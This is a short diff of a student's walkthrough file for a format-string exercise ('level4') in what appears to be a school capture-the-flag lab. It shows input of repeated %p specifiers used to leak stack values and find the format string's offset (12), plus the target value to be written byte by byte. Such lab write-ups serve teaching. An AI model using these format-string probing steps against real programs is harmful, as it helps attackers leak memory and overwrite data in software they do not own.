@@ -6,7 +6,7 @@
 #    By: lgarczyn <lgarczyn@student.42.fr>          +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2019/05/04 18:52:17 by lgarczyn          #+#    #+#              #
-#    Updated: 2019/05/04 20:01:05 by lgarczyn         ###   ########.fr        #
+#    Updated: 2019/05/06 03:50:11 by lgarczyn         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -26,8 +26,8 @@ The value is $0x1025544, or byte-wise 0x44 0x55 0x02 0x01, or 68 85 2 1 in decim
 
 Get the offset of the format string in the stack
 > ./level4
----------------------------------- %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
----------------------------------- 0x200 0xb7fd1ac0 0xb7ff37d0 0x2d2d2d2d [...]
+------------- %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+------------- 0xb7ff26b0 0xbffff774 0xb7fd0ff4 (nil) (nil) 0xbffff738 0x804848d 0xbffff530 0x200 0xb7fd1ac0 0xb7ff37d0 0x2d2d2d2d [...]
 The value is 12
 
 # Write the pointers to each byte on the stack in ascending order of desired value,
